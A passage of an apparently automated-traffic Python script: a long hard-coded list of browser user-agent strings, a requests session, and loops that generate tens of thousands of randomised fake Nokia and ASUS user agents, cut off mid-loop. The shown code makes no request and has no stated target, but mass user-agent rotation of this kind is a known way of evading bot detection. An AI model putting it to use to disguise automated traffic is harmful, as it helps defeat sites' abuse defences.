Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)R932Y) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4208.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A331R) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4322.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G943F) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4877.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z77Y) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4623.84 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)F690Q) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4668.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A325M) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4331.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A163W) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4559.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A989A) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4809.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)I202A) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4606.45 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N401W) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4371.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)W384S) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4559.60 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J417F) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4415.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)R271G) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4669.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)U487J) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4789.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)J748P) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4725.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z695M) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4498.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P676U) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4403.72 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W958C) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4605.115 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)U545M) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4466.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A713U) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4254.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)B687P) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4394.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)H674W) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4725.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C733U) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4497.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O607D) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4425.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)L877W) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4773.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P105Y) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4338.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)R330V) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4273.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)W26O) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4670.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)P297J) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4477.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A4R) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4226.111 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)D648X) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4820.78 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)S903F) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4251.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M14R) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4707.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)U221B) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4633.60 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)H501C) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4233.117 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N473I) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4825.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)W282B) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4294.65 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C929O) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4847.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)J541T) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4725.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)U209J) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4435.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O165D) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4674.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P420W) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4436.102 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O109Z) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4796.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A25P) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4685.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N756U) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4581.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y733L) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4605.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I663X) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4714.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C782R) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4447.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)D844L) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4532.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A159A) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4418.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M439C) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4258.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)P589Q) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4487.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F104A) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4879.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)X323Y) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4845.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D766P) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4526.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I419C) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4578.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)B955K) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4533.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G175G) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4446.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C191W) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4899.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Y369T) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4437.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)G704I) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4706.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)I954X) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4814.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A963W) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4660.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)E843S) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4535.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)S625P) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4368.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W438P) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4422.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)U492V) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4327.124 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P328F) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4772.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N590Q) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4821.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T132K) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4626.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A624Z) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4603.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)E231N) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4561.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E982A) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4653.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)P797R) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4608.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)V440P) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4866.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)X857Y) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4340.45 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)H91P) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4430.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)X360Z) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4526.126 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y604V) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4205.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)W690L) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4501.60 Chrome/105.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/110.0.1587.69','Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/110.0.1587.69','Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 Edge/40.15254.603','Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/44.18363.8131','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.367.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36','Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1500.55 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1284.0 Safari/537.13','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.26 Safari/537.11','Mozilla/5.0 (Windows NT 6.0) yi; AppleWebKit/345667.12221 (KHTML, like Gecko) Chrome/23.0.1271.26 Safari/453667.1221','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.17 Safari/537.11','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1','Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.724.100 Safari/534.30','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.814.0 Safari/535.1','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.815.0 Safari/535.1','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.815.10913 Safari/535.1','Chrome/15.0.860.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/15.0.860.0','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.860.0 Safari/535.2','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.864.0 Safari/535.2','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.864.0 Safari/535.2','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.872.0 Safari/535.2','Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6','Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7','Mozilla/5.0 (Windows NT 5.2; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.8','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7xs5D9rRDFpg2g','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2','Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7','Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.77 Safari/535.7ad-imcjapan-syosyaman-xkgi3lqg03!wgz','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/17.0.940.0 Safari/535.8','Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11','Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11','Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0','Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3','Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6']
ses = requests.Session()

for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku1=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku1)
for xhh in range(10000):
	aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='ASUS_I006D Build/RKQ1.201022.002'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
